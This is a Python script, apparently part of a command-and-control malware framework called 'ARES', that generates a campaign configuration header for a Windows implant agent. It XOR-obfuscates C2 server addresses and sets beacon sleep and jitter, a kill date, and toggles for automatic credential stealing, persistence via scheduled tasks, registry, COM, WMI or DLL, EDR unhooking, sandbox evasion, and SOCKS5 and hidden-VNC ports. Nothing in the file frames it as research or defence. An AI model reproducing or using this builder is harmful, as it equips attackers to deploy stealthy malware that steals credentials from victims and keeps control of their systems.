#!/usr/bin/env python3
"""
ARES FRAMEWORK -- Campaign Builder / Agent Config Generator

Generates a campaign-specific ares_config.h header file with:
- XOR-encrypted C2 endpoints
- Sleep/jitter/kill date settings
- Feature toggles (auto-steal, auto-persist, etc.)
- Unique campaign ID for tracking

Usage:
  python builder.py --c2 c2.example.com,backup.c2.net \
                    --port 8443 --sleep 15000 --jitter 30 \
                    --kill-date 2026-12-31 --campaign "OP_PHANTOM" \
                    --output agent/native/ares_config.h
"""

import argparse
import hashlib
import os
import secrets
import sys
from datetime import datetime


def xor_encrypt(plaintext, key):
    return [f"0x{(b ^ key):02X}" for b in plaintext.encode('utf-8')]


def generate_campaign_id(name):
    return hashlib.sha256(name.encode()).hexdigest()[:16]


def generate_xor_key():
    return secrets.randbelow(0xFE) + 1


def build_config(c2_endpoints, c2_port=8443, sleep_ms=10000, jitter_pct=30,
                 kill_date="", campaign_name="DEFAULT", auto_persist=True,
                 persist_method="schtask", auto_steal=True, auto_unhook=True,
                 auto_sandbox_check=True, socks5_port=9090, hvnc_port=9091,
                 xor_key=0):

    if xor_key == 0:
        xor_key = generate_xor_key()

    campaign_id = generate_campaign_id(campaign_name)
    eps = c2_endpoints[:4]

    # Parse kill date
    kill_ts = 0
    if kill_date:
        try:
            dt = datetime.strptime(kill_date, "%Y-%m-%d")
            kill_ts = int(dt.timestamp())
        except ValueError:
            print(f"  [!] Invalid kill date: {kill_date}")

    # Encrypted C2 endpoints
    c2_lines = []
    for i, ep in enumerate(eps):
        enc = xor_encrypt(ep, xor_key)
        hex_str = ", ".join(enc)
        c2_lines.append(f'/* "{ep}" */')
        c2_lines.append(f'static const BYTE CFG_C2_{i}[] = {{{hex_str}}};')
        c2_lines.append(f'#define CFG_C2_{i}_LEN {len(ep)}')
        c2_lines.append('')
    c2_block = "\n".join(c2_lines)

    # Feature flags
    flags = []
    flags.append(f'#define CFG_AUTO_PERSIST      {1 if auto_persist else 0}')
    if auto_persist:
        flags.append(f'#define CFG_PERSIST_METHOD    "{persist_method}"')
    flags.append(f'#define CFG_AUTO_STEAL        {1 if auto_steal else 0}')
    flags.append(f'#define CFG_AUTO_UNHOOK       {1 if auto_unhook else 0}')
    flags.append(f'#define CFG_SANDBOX_CHECK     {1 if auto_sandbox_check else 0}')
    flags_block = "\n".join(flags)

    # Build ARES_DECODE_CONFIG macro with proper backslash continuations
    macro_parts = []
    macro_parts.append('#define ARES_DECODE_CONFIG(s) do {')
    for i in range(len(eps)):
        macro_parts.append(f'    _xd((s)->config.c2_endpoints[{i}], CFG_C2_{i}, CFG_C2_{i}_LEN, CFG_XOR_KEY);')
    macro_parts.append('    (s)->config.c2_count = CFG_C2_COUNT;')
    macro_parts.append('} while(0)')
    # Join all but last with ' \'
    macro_result = []
    for i, part in enumerate(macro_parts):
        if i < len(macro_parts) - 1:
            macro_result.append(part + ' \\')
        else:
            macro_result.append(part)
    macro_block = "\n".join(macro_result)

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    lines = []
    lines.append('/*')
    lines.append(f' *  ARES AGENT -- Campaign Configuration (AUTO-GENERATED)')
    lines.append(f' *')
    lines.append(f' *  Campaign:  {campaign_name}')
    lines.append(f' *  ID:        {campaign_id}')
    lines.append(f' *  Generated: {now}')
    lines.append(f' *  XOR Key:   0x{xor_key:02X}')
    lines.append(f' *  C2 Count:  {len(eps)}')
    lines.append(f' *')
    lines.append(f' *  DO NOT EDIT MANUALLY -- use builder.py to regenerate.')
    lines.append(' */')
    lines.append('')
    lines.append('#ifndef ARES_CONFIG_H')
    lines.append('#define ARES_CONFIG_H')
    lines.append('')
    lines.append('#include <windows.h>')
    lines.append('')
    lines.append(f'#define CFG_CAMPAIGN_ID       "{campaign_id}"')
    lines.append(f'#define CFG_CAMPAIGN_NAME     "{campaign_name}"')
    lines.append(f'#define CFG_XOR_KEY           0x{xor_key:02X}')
    lines.append('')
    lines.append(f'#define CFG_SLEEP_MS          {sleep_ms}')
    lines.append(f'#define CFG_JITTER_PCT        {jitter_pct}')
    lines.append(f'#define CFG_KILL_DATE_TS      {kill_ts}')
    lines.append('')
    lines.append(f'#define CFG_C2_PORT           {c2_port}')
    lines.append(f'#define CFG_C2_COUNT          {len(eps)}')
    lines.append(f'#define CFG_SOCKS5_PORT       {socks5_port}')
    lines.append(f'#define CFG_HVNC_PORT         {hvnc_port}')
    lines.append('')
    lines.append(flags_block)
    lines.append('')
    lines.append(c2_block)
    lines.append(macro_block)
    lines.append('')
    lines.append('#endif /* ARES_CONFIG_H */')
    lines.append('')

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description='ARES Campaign Builder -- Generate per-campaign agent config',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python builder.py --c2 c2.example.com --campaign OP_TEST
  python builder.py --c2 c2.host1.com,c2.host2.net --port 443 --sleep 30000
  python builder.py --c2 cdn.example.com --kill-date 2026-12-31 --no-persist
        """
    )

    parser.add_argument('--c2', required=True, help='C2 endpoints (comma-separated, max 4)')
    parser.add_argument('--port', type=int, default=8443, help='C2 port (default: 8443)')
    parser.add_argument('--sleep', type=int, default=10000, help='Sleep interval ms (default: 10000)')
    parser.add_argument('--jitter', type=int, default=30, help='Jitter %% (default: 30)')
    parser.add_argument('--kill-date', type=str, default='', help='Kill date (YYYY-MM-DD)')
    parser.add_argument('--campaign', type=str, default='DEFAULT', help='Campaign name')
    parser.add_argument('--xor-key', type=lambda x: int(x, 0), default=0, help='XOR key (default: random)')
    parser.add_argument('--socks5-port', type=int, default=9090)
    parser.add_argument('--hvnc-port', type=int, default=9091)
    parser.add_argument('--no-persist', action='store_true')
    parser.add_argument('--persist-method', type=str, default='schtask',
                        choices=['schtask', 'reg', 'com', 'wmi', 'dll', 'all'])
    parser.add_argument('--no-steal', action='store_true')
    parser.add_argument('--no-unhook', action='store_true')
    parser.add_argument('--no-sandbox', action='store_true')
    parser.add_argument('--output', type=str, default='agent/native/ares_config.h')

    args = parser.parse_args()

    c2_list = [x.strip() for x in args.c2.split(',') if x.strip()]
    if not c2_list:
        print("  [!] No C2 endpoints specified")
        sys.exit(1)

    print(f"\n  [*] ARES Campaign Builder")
    print(f"  Campaign:  {args.campaign}")
    print(f"  C2:        {', '.join(c2_list)}")
    print(f"  Port:      {args.port}")
    print(f"  Sleep:     {args.sleep}ms +/- {args.jitter}%")
    if args.kill_date:
        print(f"  Kill Date: {args.kill_date}")
    print()

    config = build_config(
        c2_endpoints=c2_list, c2_port=args.port, sleep_ms=args.sleep,
        jitter_pct=args.jitter, kill_date=args.kill_date,
        campaign_name=args.campaign, auto_persist=not args.no_persist,
        persist_method=args.persist_method, auto_steal=not args.no_steal,
        auto_unhook=not args.no_unhook, auto_sandbox_check=not args.no_sandbox,
        socks5_port=args.socks5_port, hvnc_port=args.hvnc_port,
        xor_key=args.xor_key,
    )

    os.makedirs(os.path.dirname(args.output) or '.', exist_ok=True)
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(config)

    print(f"  [+] Config written to: {args.output}")
    print(f"  [+] Build with: make agent")
    print()


if __name__ == '__main__':
    main()
